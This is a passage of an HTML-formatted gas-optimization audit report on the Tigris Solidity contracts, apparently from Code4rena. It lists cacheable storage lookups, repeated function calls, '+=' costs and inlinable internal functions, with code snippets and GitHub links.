class=\"mtk12\">baseFundingRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_baseFundingRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 74</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxLeverage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_maxLeverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 78</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">minLeverage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 81</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 84</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxLeverage</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">minLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Wrong leverage values&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 93</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">baseFundingRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_baseFundingRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset] on line 105</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">feeMultiplier</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_feeMultiplier</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L36</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _limitOrders[&lt;etc&gt;] on line 150</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">_limitOrderIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintTrade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">newTokenID</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintTrade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _assetOpenPositions[&lt;etc&gt;] on line 157</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">158</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">_assetOpenPositionsIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintTrade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">newTokenID</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_assetOpenPositions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_mintTrade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _limitOrders[_asset] on line 177</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_limitOrderIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">]] = </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _limitOrders[_asset] on line 178</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk11\">pop</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _assetOpenPositions[_asset] on line 184</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_assetOpenPositionsIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_assetOpenPositions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 198</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newLeverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 210</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 211</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 212</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 212</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 212</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">initId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">accInterestPerOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">direction</span><span class=\"mtk1\">]*</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newMargin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 231</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">accInterest</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">accInterest</span><span class=\"mtk1\">*</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">)/</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 231</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 232</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">margin</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 232</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 233</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 233</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 233</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 233</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">initId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">accInterestPerOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">direction</span><span class=\"mtk1\">]*</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id] on line 262</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">orderType</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _limitOrders[_asset] on line 264</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_limitOrderIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">]] = </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _limitOrders[_asset] on line 265</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk11\">pop</span><span class=\"mtk1\">();            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _assetOpenPositions[_asset] on line 269</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">_assetOpenPositions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_assetOpenPositionsIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">]] = </span><span class=\"mtk12\">_assetOpenPositions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_assetOpenPositions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _assetOpenPositions[_asset] on line 270</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">272</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">_assetOpenPositions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk11\">pop</span><span class=\"mtk1\">();  </span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L151</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit blockDelayPassed[_id] on line 861</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">864</span><span class=\"mtk1\">:                  </span><span class=\"mtk12\">blockDelayPassed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">delay</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">blockDelay</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit blockDelayPassed[_id] on line 864</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">865</span><span class=\"mtk1\">:                  </span><span class=\"mtk12\">blockDelayPassed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">actionType</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_type</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L864</p>\n<h2 id=\"g08--the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#g08--the-result-of-function-calls-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"g08  the result of function calls should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑08]  The result of function calls should be cached rather than re-calling the function</h2>\n<p>The instances below point to the second+ call of the function within a single function</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit position.getCount() on line 173</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PositionOpened</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCount</span><span class=\"mtk1\">()-</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_marginAfterFees</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L208</p>\n<h2 id=\"g09--x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#g09--x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"g09  x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑09]  <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</h2>\n<p>Using the addition operator instead of plus-equals saves <strong><a href=\"https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8\">113 gas</a></strong></p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">counter</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L52</p>\n<h2 id=\"g10--internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g10--internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g10  internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑10]  <code>internal</code> functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs <strong>20 to 40 gas</strong> because of two extra <code>JUMP</code> instructions and additional stack operations needed for function calls.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">323</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">324           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">325           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">326:          </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_id</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L323-L326</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span 